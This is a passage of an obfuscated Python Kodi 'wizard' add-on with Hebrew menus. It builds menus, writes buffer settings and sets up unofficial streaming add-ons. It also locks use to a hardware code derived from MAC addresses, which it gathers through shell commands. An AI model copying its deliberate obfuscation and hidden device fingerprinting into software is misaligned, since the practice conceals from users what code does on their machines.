					O0000OOO000O0O00O =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (O0000OO00OOOOO0OO )#line:1704
				for OO000OO000OOOOO0O in O0000OOO000O0O00O :#line:1705
					OO0000O0OO0OOOO0O =OO000OO000OOOOO0O [0 ]#line:1706
					if OO0000O0OO0OOOO0O in "'\"":#line:1707
						if OO000OO000OOOOO0O .find ('='+OO0000O0OO0OOOO0O ,OO000OO000OOOOO0O .find (OO0000O0OO0OOOO0O ,1 ))>-1 :#line:1708
							OO000OO000OOOOO0O =OO000OO000OOOOO0O [:OO000OO000OOOOO0O .find ('='+OO0000O0OO0OOOO0O ,OO000OO000OOOOO0O .find (OO0000O0OO0OOOO0O ,1 ))]#line:1709
						if OO000OO000OOOOO0O .rfind (OO0000O0OO0OOOO0O ,1 )>-1 :#line:1711
							OO000OO000OOOOO0O =OO000OO000OOOOO0O [1 :OO000OO000OOOOO0O .rfind (OO0000O0OO0OOOO0O )]#line:1712
					else :#line:1713
						if OO000OO000OOOOO0O .find (" ")>0 :#line:1714
							OO000OO000OOOOO0O =OO000OO000OOOOO0O [:OO000OO000OOOOO0O .find (" ")]#line:1715
						elif OO000OO000OOOOO0O .find ("/")>0 :#line:1716
							OO000OO000OOOOO0O =OO000OO000OOOOO0O [:OO000OO000OOOOO0O .find ("/")]#line:1717
						elif OO000OO000OOOOO0O .find (">")>0 :#line:1718
							OO000OO000OOOOO0O =OO000OO000OOOOO0O [:OO000OO000OOOOO0O .find (">")]#line:1719
					OOOOOO0OO00O0000O .append (OO000OO000OOOOO0O .strip ())#line:1721
			OOO0000O00OO0OO0O =OOOOOO0OO00O0000O #line:1722
		else :#line:1723
			OOOOOO0OO00O0000O =[]#line:1724
			for O0000OO00OOOOO0OO in OOO0000O00OO0OO0O :#line:1725
				O0O0O00OO0000O000 =u"</"+name #line:1726
				OOO00O0O00O0000O0 =OO0OOO0O0OO0OO00O .find (O0000OO00OOOOO0OO )#line:1728
				O0OO00OOO0000000O =OO0OOO0O0OO0OO00O .find (O0O0O00OO0000O000 ,OOO00O0O00O0000O0 )#line:1729
				OOO0OOOOO00O00O00 =OO0OOO0O0OO0OO00O .find ("<"+name ,OOO00O0O00O0000O0 +1 )#line:1730
				while OOO0OOOOO00O00O00 <O0OO00OOO0000000O and OOO0OOOOO00O00O00 !=-1 :#line:1732
					OOO0OO000O0O0000O =OO0OOO0O0OO0OO00O .find (O0O0O00OO0000O000 ,O0OO00OOO0000000O +len (O0O0O00OO0000O000 ))#line:1733
					if OOO0OO000O0O0000O !=-1 :#line:1734
						O0OO00OOO0000000O =OOO0OO000O0O0000O #line:1735
					OOO0OOOOO00O00O00 =OO0OOO0O0OO0OO00O .find ("<"+name ,OOO0OOOOO00O00O00 +1 )#line:1736
				if OOO00O0O00O0000O0 ==-1 and O0OO00OOO0000000O ==-1 :#line:1738
					OOOOO0OOOOO0OOOOO =u""#line:1739
				elif OOO00O0O00O0000O0 >-1 and O0OO00OOO0000000O >-1 :#line:1740
					OOOOO0OOOOO0OOOOO =OO0OOO0O0OO0OO00O [OOO00O0O00O0000O0 +len (O0000OO00OOOOO0OO ):O0OO00OOO0000000O ]#line:1741
				elif O0OO00OOO0000000O >-1 :#line:1742
					OOOOO0OOOOO0OOOOO =OO0OOO0O0OO0OO00O [:O0OO00OOO0000000O ]#line:1743
				elif OOO00O0O00O0000O0 >-1 :#line:1744
					OOOOO0OOOOO0OOOOO =OO0OOO0O0OO0OO00O [OOO00O0O00O0000O0 +len (O0000OO00OOOOO0OO ):]#line:1745
				if ret :#line:1747
					O0O0O00OO0000O000 =OO0OOO0O0OO0OO00O [O0OO00OOO0000000O :OO0OOO0O0OO0OO00O .find (">",OO0OOO0O0OO0OO00O .find (O0O0O00OO0000O000 ))+1 ]#line:1748
					OOOOO0OOOOO0OOOOO =O0000OO00OOOOO0OO +OOOOO0OOOOO0OOOOO +O0O0O00OO0000O000 #line:1749
				OO0OOO0O0OO0OO00O =OO0OOO0O0OO0OO00O [OO0OOO0O0OO0OO00O .find (OOOOO0OOOOO0OOOOO ,OO0OOO0O0OO0OO00O .find (O0000OO00OOOOO0OO ))+len (OOOOO0OOOOO0OOOOO ):]#line:1751
				OOOOOO0OO00O0000O .append (OOOOO0OOOOO0OOOOO )#line:1752
			OOO0000O00OO0OO0O =OOOOOO0OO00O0000O #line:1753
		O0000O0OO0OOO000O +=OOO0000O00OO0OO0O #line:1754
	return O0000O0OO0OOO000O #line:1756
def addItem (OOO000O00OO0OOO00 ,OOO0O0O00OO00000O ,O00O00000OOO00OO0 ,O0O0OOO0OOOOOOO0O ,OOOO00O00O0OOOOO0 ,description =None ):#line:1758
	if description ==None :description =''#line:1759
	description ='[COLOR white]'+description +'[/COLOR]'#line:1760
	O000OO0O000OOO0OO =sys .argv [0 ]+"?url="+urllib .quote_plus (OOO0O0O00OO00000O )+"&mode="+str (O00O00000OOO00OO0 )+"&name="+urllib .quote_plus (OOO000O00OO0OOO00 )+"&iconimage="+urllib .quote_plus (O0O0OOO0OOOOOOO0O )+"&fanart="+urllib .quote_plus (OOOO00O00O0OOOOO0 )#line:1761
	OOO00OO00000000O0 =True #line:1762
	OOO000OO00OOO0O00 =xbmcgui .ListItem (OOO000O00OO0OOO00 ,iconImage =O0O0OOO0OOOOOOO0O ,thumbnailImage =O0O0OOO0OOOOOOO0O )#line:1763
	OOO000OO00OOO0O00 .setInfo (type ="Video",infoLabels ={"Title":OOO000O00OO0OOO00 ,"Plot":description })#line:1764
	OOO000OO00OOO0O00 .setProperty ("fanart_Image",OOOO00O00O0OOOOO0 )#line:1765
	OOO000OO00OOO0O00 .setProperty ("icon_Image",O0O0OOO0OOOOOOO0O )#line:1766
	OOO00OO00000000O0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O000OO0O000OOO0OO ,listitem =OOO000OO00OOO0O00 ,isFolder =False )#line:1767
	return OOO00OO00000000O0 #line:1768
def get_params ():#line:1770
		O0OOOOO00O0OO0O00 =[]#line:1771
		O00OOOOO00O000O0O =sys .argv [2 ]#line:1772
		if len (O00OOOOO00O000O0O )>=2 :#line:1773
				OOOOO00OOOOOO00OO =sys .argv [2 ]#line:1774
				O0000000000O00OOO =OOOOO00OOOOOO00OO .replace ('?','')#line:1775
				if (OOOOO00OOOOOO00OO [len (OOOOO00OOOOOO00OO )-1 ]=='/'):#line:1776
						OOOOO00OOOOOO00OO =OOOOO00OOOOOO00OO [0 :len (OOOOO00OOOOOO00OO )-2 ]#line:1777
				OO0000000OOO0O00O =O0000000000O00OOO .split ('&')#line:1778
				O0OOOOO00O0OO0O00 ={}#line:1779
				for O0O0000OO0000O0OO in range (len (OO0000000OOO0O00O )):#line:1780
						OO0OO0OO00O0O00OO ={}#line:1781
						OO0OO0OO00O0O00OO =OO0000000OOO0O00O [O0O0000OO0000O0OO ].split ('=')#line:1782
						if (len (OO0OO0OO00O0O00OO ))==2 :#line:1783
								O0OOOOO00O0OO0O00 [OO0OO0OO00O0O00OO [0 ]]=OO0OO0OO00O0O00OO [1 ]#line:1784
		return O0OOOOO00O0OO0O00 #line:1786
def decode (O00OO00O0OO000OO0 ,OOOOOOO00OO0OOO00 ):#line:1791
    import base64 #line:1792
    OOO0O00OO0000OO0O =[]#line:1793
    if (len (O00OO00O0OO000OO0 ))!=4 :#line:1795
     return 10 #line:1796
    OOOOOOO00OO0OOO00 =base64 .urlsafe_b64decode (OOOOOOO00OO0OOO00 )#line:1797
    for O0OOOOOO000OO0O0O in range (len (OOOOOOO00OO0OOO00 )):#line:1799
        OOOOO0O0O0O0OO0O0 =O00OO00O0OO000OO0 [O0OOOOOO000OO0O0O %len (O00OO00O0OO000OO0 )]#line:1800
        OO00OO0OO0OO0O000 =chr ((256 +ord (OOOOOOO00OO0OOO00 [O0OOOOOO000OO0O0O ])-ord (OOOOO0O0O0O0OO0O0 ))%256 )#line:1801
        OOO0O00OO0000OO0O .append (OO00OO0OO0OO0O000 )#line:1802
    return "".join (OOO0O00OO0000OO0O )#line:1803
def tmdb_list (O00O00O000OOO0OO0 ):#line:1804
    O0O00O0O00O0OOO00 =decode ("7643",O00O00O000OOO0OO0 )#line:1807
    return int (O0O00O0O00O0OOO00 )#line:1810
def u_list (OO0O00O00OO000000 ):#line:1811
    if xbmc .getCondVisibility ('system.platform.windows')or xbmc .getCondVisibility ('system.platform.android'):#line:1813
        from math import sqrt #line:1814
        O00OOOOO0O0O00OOO =tmdb_list (TMDB_NEW_API )#line:1815
        O00000O0000O0OOO0 =str ((getHwAddr ('eth0'))*O00OOOOO0O0O00OOO )#line:1817
        OO000OOOOO00OOOOO =int (O00000O0000O0OOO0 [1 ]+O00000O0000O0OOO0 [2 ]+O00000O0000O0OOO0 [5 ]+O00000O0000O0OOO0 [7 ])#line:1818
        OO00O000OOO0OOOOO =(ADDON .getSetting ("pass"))#line:1820
        O000OOOO0000OO0OO =(str (round (sqrt ((OO000OOOOO00OOOOO *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1825
        if '.'in O000OOOO0000OO0OO :#line:1827
         O000OOOO0000OO0OO =(str (round (sqrt ((OO000OOOOO00OOOOO *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1828
        if OO00O000OOO0OOOOO ==O000OOOO0000OO0OO :#line:1830
          O000OOO0O00OOOO0O =OO0O00O00OO000000 #line:1832
        else :#line:1834
           if STARTP2 ()and STARTP ()=='ok':#line:1835
             return OO0O00O00OO000000 #line:1838
           O000OOO0O00OOOO0O ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1839
           xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1840
           sys .exit ()#line:1841
        return O000OOO0O00OOOO0O #line:1842
    else :#line:1843
        STARTP ()#line:1844
def disply_hwr ():#line:1848
   try :#line:1849
    O0OO0O0O00000O0O0 =tmdb_list (TMDB_NEW_API )#line:1850
    OO0O0OO0O0OO0OO00 =str ((getHwAddr ('eth0'))*O0OO0O0O00000O0O0 )#line:1851
    OO000OO000OO0OOOO =(OO0O0OO0O0OO0OO00 [1 ]+OO0O0OO0O0OO0OO00 [2 ]+OO0O0OO0O0OO0OO00 [5 ]+OO0O0OO0O0OO0OO00 [7 ])#line:1858
    OOO0OO0OO0O00OO00 =(ADDON .getSetting ("action"))#line:1859
    wiz .setS ('action',str (OO000OO000OO0OOOO ))#line:1861
   except :pass #line:1862
def disply_hwr2 ():#line:1863
   try :#line:1864
    OOO0O00O0OO000OOO =tmdb_list (TMDB_NEW_API )#line:1865
    OOOOOOOOO0OOO00OO =str ((getHwAddr ('eth0'))*OOO0O00O0OO000OOO )#line:1867
    OOOO0O0O0OOO00000 =(OOOOOOOOO0OOO00OO [1 ]+OOOOOOOOO0OOO00OO [2 ]+OOOOOOOOO0OOO00OO [5 ]+OOOOOOOOO0OOO00OO [7 ])#line:1876
    O0000OOOO0OO0O0OO =(ADDON .getSetting ("action"))#line:1877
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",OOOO0O0O0OOO00000 )#line:1880
   except :pass #line:1881
def getHwAddr (OOO0OO000000O0OO0 ):#line:1883
   import subprocess ,time #line:1884
   O0OO00000O000O000 ='windows'#line:1885
   if xbmc .getCondVisibility ('system.platform.android'):#line:1886
       O0OO00000O000O000 ='android'#line:1887
   if xbmc .getCondVisibility ('system.platform.android'):#line:1888
     O00000OOO0OO00OOO =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1889
     OO0O0O000O00OOOOO =re .compile ('link/ether (.+?) brd').findall (str (O00000OOO0OO00OOO ))#line:1891
     O0O00OO0OO0000OO0 =0 #line:1892
     for O000OO000OOOO00O0 in OO0O0O000O00OOOOO :#line:1893
      if OO0O0O000O00OOOOO !='00:00:00:00:00:00':#line:1894
          OO000OOO0O0OOO0O0 =O000OO000OOOO00O0 #line:1895
          O0O00OO0OO0000OO0 =O0O00OO0OO0000OO0 +int (OO000OOO0O0OOO0O0 .replace (':',''),16 )#line:1896
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1898
       O0000OO0O00000000 =0 #line:1899
       O0O00OO0OO0000OO0 =0 #line:1900
       O0000OOOOO0OOOO00 =[]#line:1901
       O000OO0OOOOO0OO0O =os .popen ("getmac").read ()#line:1902
       O000OO0OOOOO0OO0O =O000OO0OOOOO0OO0O .split ("\n")#line:1903
       for OO0OO0000O0O00OOO in O000OO0OOOOO0OO0O :#line:1905
            OOOO0000000OO000O =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OO0OO0000O0O00OOO ,re .I )#line:1906
            if OOOO0000000OO000O :#line:1907
                OO0O0O000O00OOOOO =OOOO0000000OO000O .group ().replace ('-',':')#line:1908
                O0000OOOOO0OOOO00 .append (OO0O0O000O00OOOOO )#line:1909
                O0O00OO0OO0000OO0 =O0O00OO0OO0000OO0 +int (OO0O0O000O00OOOOO .replace (':',''),16 )#line:1912
   else :#line:1914
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1915
   try :#line:1932
    return O0O00OO0OO0000OO0 #line:1933
   except :pass #line:1934
def getpass ():#line:1935
	disply_hwr2 ()#line:1937
def setpass ():#line:1938
    O00OOO0OO0O00OOO0 =xbmcgui .Dialog ()#line:1939
    O000O0O0O00OO00O0 =''#line:1940
    O0OOO0OOO00O000O0 =xbmc .Keyboard (O000O0O0O00OO00O0 ,'הכנס סיסמה')#line:1942
    O0OOO0OOO00O000O0 .doModal ()#line:1943
    if O0OOO0OOO00O000O0 .isConfirmed ():#line:1944
           O0OOO0OOO00O000O0 =O0OOO0OOO00O000O0 .getText ()#line:1945
    wiz .setS ('pass',str (O0OOO0OOO00O000O0 ))#line:1946
def setuname ():#line:1947
    OOO0O0OOOOOO000O0 =''#line:1948
    OO000O0OO00O00000 =xbmc .Keyboard (OOO0O0OOOOOO000O0 ,'הכנס שם משתמש')#line:1949
    OO000O0OO00O00000 .doModal ()#line:1950
    if OO000O0OO00O00000 .isConfirmed ():#line:1951
           OOO0O0OOOOOO000O0 =OO000O0OO00O00000 .getText ()#line:1952
           wiz .setS ('user',str (OOO0O0OOOOOO000O0 ))#line:1953
def powerkodi ():#line:1954
    os ._exit (1 )#line:1955
def buffer1 ():#line:1957
	OOOOO00OOO000O0O0 =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1958
	O000OO00000O0OOO0 =xbmc .getInfoLabel ("System.Memory(total)")#line:1959
	O00O0OOO00OOOO0O0 =xbmc .getInfoLabel ("System.FreeMemory")#line:1960
	OOOOO00O000O0O0OO =re .sub ('[^0-9]','',O00O0OOO00OOOO0O0 )#line:1961
	OOOOO00O000O0O0OO =int (OOOOO00O000O0O0OO )/3 #line:1962
	O0000OO00O00OO0O0 =OOOOO00O000O0O0OO *1024 *1024 #line:1963
	try :O0O00O0O0OOO0O000 =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1964
	except :O0O00O0O0OOO0O000 =16 #line:1965
	OO00OOOOO0O0OOOOO =DIALOG .yesno ('FREE MEMORY: '+str (O00O0OOO00OOOO0O0 ),'Based on your free Memory your optimal buffersize is: '+str (OOOOO00O000O0O0OO )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1968
	if OO00OOOOO0O0OOOOO ==1 :#line:1969
		with open (OOOOO00OOO000O0O0 ,"w")as OOO000O0OO00OO0OO :#line:1970
			if O0O00O0O0OOO0O000 >=17 :OOOOO0O0O000OOO00 =xml_data_advSettings_New (str (O0000OO00O00OO0O0 ))#line:1971
			else :OOOOO0O0O000OOO00 =xml_data_advSettings_old (str (O0000OO00O00OO0O0 ))#line:1972
			OOO000O0OO00OO0OO .write (OOOOO0O0O000OOO00 )#line:1974
			DIALOG .ok ('Buffer Size Set to: '+str (O0000OO00O00OO0O0 ),'Please restart Kodi for settings to apply.','')#line:1975
	elif OO00OOOOO0O0OOOOO ==0 :#line:1977
		O0000OO00O00OO0O0 =_O0O000OO0O0000OOO (default =str (O0000OO00O00OO0O0 ),heading ="INPUT BUFFER SIZE")#line:1978
		with open (OOOOO00OOO000O0O0 ,"w")as OOO000O0OO00OO0OO :#line:1979
			if O0O00O0O0OOO0O000 >=17 :OOOOO0O0O000OOO00 =xml_data_advSettings_New (str (O0000OO00O00OO0O0 ))#line:1980
			else :OOOOO0O0O000OOO00 =xml_data_advSettings_old (str (O0000OO00O00OO0O0 ))#line:1981
			OOO000O0OO00OO0OO .write (OOOOO0O0O000OOO00 )#line:1982
			DIALOG .ok ('Buffer Size Set to: '+str (O0000OO00O00OO0O0 ),'Please restart Kodi for settings to apply.','')#line:1983
def xml_data_advSettings_old (OOOO0O000OO000OOO ):#line:1984
	OOOO00O000O0OOO00 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%OOOO0O000OO000OOO #line:1994
	return OOOO00O000O0OOO00 #line:1995
def xml_data_advSettings_New (O00OOO0O0O0OO0O00 ):#line:1997
	OOOO000000OOOOOOO ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%O00OOO0O0O0OO0O00 #line:2009
	return OOOO000000OOOOOOO #line:2010
def write_ADV_SETTINGS_XML (OO000OOOO00000O00 ):#line:2011
    if not os .path .exists (xml_file ):#line:2012
        with open (xml_file ,"w")as OOO0OO0O000OOO0OO :#line:2013
            OOO0OO0O000OOO0OO .write (xml_data )#line:2014
def _O0O000OO0O0000OOO (default ="",heading ="",hidden =False ):#line:2015
    ""#line:2016
    O0O000000O0OOO000 =xbmc .Keyboard (default ,heading ,hidden )#line:2017
    O0O000000O0OOO000 .doModal ()#line:2018
    if (O0O000000O0OOO000 .isConfirmed ()):#line:2019
        return unicode (O0O000000O0OOO000 .getText (),"utf-8")#line:2020
    return default #line:2021
def index ():#line:2023
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:2024
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2025
	if AUTOUPDATE =='Yes':#line:2026
		if wiz .workingURL (WIZARDFILE )==True :#line:2027
			O0OO00OO00OO00O0O =wiz .checkWizard ('version')#line:2028
			if O0OO00OO00OO00O0O >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,O0OO00OO00OO00O0O ),'wizardupdate',themeit =THEME2 )#line:2029
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2030
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2031
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2032
	if len (BUILDNAME )>0 :#line:2033
		O0O0OO0O000O00OO0 =wiz .checkBuild (BUILDNAME ,'version')#line:2034
		O0O0OO0O000O0O000 ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:2035
		if O0O0OO0O000O00OO0 >BUILDVERSION :O0O0OO0O000O0O000 ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(O0O0OO0O000O0O000 ,O0O0OO0O000O00OO0 )#line:2036
		addDir (O0O0OO0O000O0O000 ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:2038
		try :#line:2040
		     O0OOO0OO0O000O0OO =wiz .themeCount (BUILDNAME )#line:2041
		except :#line:2042
		   O0OOO0OO0O000O0OO =False #line:2043
		if not O0OOO0OO0O000O0OO ==False :#line:2044
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:2045
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:2046
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2049
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2050
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2051
	addFile ('אימות חשבונות','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:2055
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:2057
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:2059
def morsetup ():#line:2061
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:2062
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:2063
	addDir ('הגדרת חשבון Rd ו Trakt','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:2064
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:2065
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:2066
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:2070
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:2071
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:2074
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:2075
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:2085
	setView ('files','viewType')#line:2086
def morsetup2 ():#line:2087
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:2088
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:2089
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:2090
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:2091
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:2092
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:2093
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:2094
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:2095
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:2096
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:2097
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:2098
def fastupdate ():#line:2099
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:2100
def forcefastupdate ():#line:2102
			OOO000O00OO000000 ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:2103
			wiz .ForceFastUpDate (ADDONTITLE ,OOO000O00OO000000 )#line:2104
def rdsetup ():#line:2108
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:2109
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:2110
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:2112
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:2113
def traktsetup ():#line:2116
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2117
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2118
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2119
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2120
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2121
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2122
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2123
	setView ('files','viewType')#line:2124
def setautorealdebrid ():#line:2125
    from resources .libs import real_debrid #line:2126
    OOO000OO0O0OOOO0O =real_debrid .RealDebridFirst ()#line:2127
    OOO000OO0O0OOOO0O .auth ()#line:2128
def setrealdebrid ():#line:2130
    O000OO0O0OOO0OO0O =(ADDON .getSetting ("auto_rd"))#line:2131
    if O000OO0O0OOO0OO0O =='false':#line:2132
       ADDON .openSettings ()#line:2133
    else :#line:2134
        from resources .libs import real_debrid #line:2135
        O0O000OOO00OOO00O =real_debrid .RealDebrid ()#line:2136
        O0O000OOO00OOO00O .auth ()#line:2137
        rdon ()#line:2140
def resolveurlsetup ():#line:2142
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:2143
def urlresolversetup ():#line:2144
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:2145
def placentasetup ():#line:2147
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:2148
def reptiliasetup ():#line:2149
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:2150
def flixnetsetup ():#line:2151
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:2152
def yodasetup ():#line:2153
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:2154
def numberssetup ():#line:2155
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:2156
def uranussetup ():#line:2157
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:2158
def genesissetup ():#line:2159
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:2160
def net_tools (view =None ):#line:2162
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:2163
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2164
	setView ('files','viewType')#line:2166
def speedMenu ():#line:2167
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:2168
def viewIP ():#line:2169
	O0000OO0OOOO0O0O0 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2183
	O0OOOOO00OOOO0000 =[];OOO0OOOOOOO00O000 =0 #line:2184
	for O0000000O0000OOO0 in O0000OO0OOOO0O0O0 :#line:2185
		O0000O0OO0OOOOOOO =wiz .getInfo (O0000000O0000OOO0 )#line:2186
		OOO0O0000OO00OOO0 =0 #line:2187
		while O0000O0OO0OOOOOOO =="Busy"and OOO0O0000OO00OOO0 <10 :#line:2188
			O0000O0OO0OOOOOOO =wiz .getInfo (O0000000O0000OOO0 );OOO0O0000OO00OOO0 +=1 ;wiz .log ("%s sleep %s"%(O0000000O0000OOO0 ,str (OOO0O0000OO00OOO0 )));xbmc .sleep (1000 )#line:2189
		O0OOOOO00OOOO0000 .append (O0000O0OO0OOOOOOO )#line:2190
		OOO0OOOOOOO00O000 +=1 #line:2191
	OOOO000O0OO00O0OO ,O000000000OOO0OO0 ,O00OOOOOO00OOOO0O =getIP ()#line:2192
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOOOO00OOOO0000 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2193
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO000O0OO00O0OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2194
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000000000OOO0OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2195
